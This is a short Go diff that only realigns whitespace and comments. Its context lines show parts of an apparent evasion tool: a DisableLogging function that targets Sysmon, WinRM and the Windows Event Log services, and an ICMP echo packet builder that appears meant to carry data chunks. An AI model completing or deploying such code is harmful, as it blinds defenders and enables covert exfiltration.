@@ -21,8 +21,8 @@ func DisableLogging() error {
 	services := []string{
 		"Sysmon",
 		"WinRM",
-		"Wecsvc",       // Windows Event Collector
-		"EventLog",     // Windows Event Log
+		"Wecsvc",   // Windows Event Collector
+		"EventLog", // Windows Event Log
 	}
 
 	for _, svc := range services {
@@ -182,10 +182,10 @@ func splitChunks(s string, size int) []string {
 func buildICMPEcho(data []byte) []byte {
 	// ICMP Echo Request: Type=8, Code=0
 	msg := make([]byte, 8+len(data))
-	msg[0] = 8  // Echo Request
-	msg[1] = 0  // Code
-	msg[2] = 0  // Checksum (calculated below)
-	msg[3] = 0  // Checksum
+	msg[0] = 8                              // Echo Request
+	msg[1] = 0                              // Code
+	msg[2] = 0                              // Checksum (calculated below)
+	msg[3] = 0                              // Checksum
 	binary.BigEndian.PutUint16(msg[4:6], 1) // Identifier
 	binary.BigEndian.PutUint16(msg[6:8], 1) // Sequence
 
